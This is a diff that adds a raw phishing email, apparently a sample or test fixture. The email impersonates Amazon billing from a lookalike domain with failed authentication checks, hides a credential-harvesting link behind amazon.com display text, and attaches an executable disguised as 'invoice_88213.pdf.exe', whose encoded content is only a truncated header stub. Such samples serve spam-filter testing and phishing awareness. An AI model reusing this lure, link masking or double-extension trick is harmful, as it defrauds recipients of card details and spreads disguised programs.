@@ -1,0 +1,36 @@
+From: "Billing Department" <billing@amaz0n-payments.xyz>
+To: customer@example.com
+Subject: Your Invoice #88213 - Payment Failed
+Date: Thu, 18 Jun 2026 03:11:44 +0000
+Message-ID: <inv88213@amaz0n-payments.xyz>
+Return-Path: <noreply@trk-mailservice22.icu>
+Authentication-Results: mx.example.com; spf=fail; dkim=fail; dmarc=fail
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY123456"
+
+--BOUNDARY123456
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+
+<html>
+<body>
+<p>Dear Valued Customer,</p>
+<p>We were unable to process your recent payment. Your order will be cancelled unless
+you update your billing information within 24 hours.</p>
+<p>Please review your invoice and confirm your card details here:
+<a href="http://amaz0n-billing-update.icu/secure/login">www.amazon.com/account/billing</a></p>
+<p>See attached invoice for full details.</p>
+<p>Regards,<br>Amazon Billing Team</p>
+</body>
+</html>
+
+--BOUNDARY123456
+Content-Type: application/octet-stream; name="invoice_88213.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice_88213.pdf.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBy
+dW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA=
+
+--BOUNDARY123456--
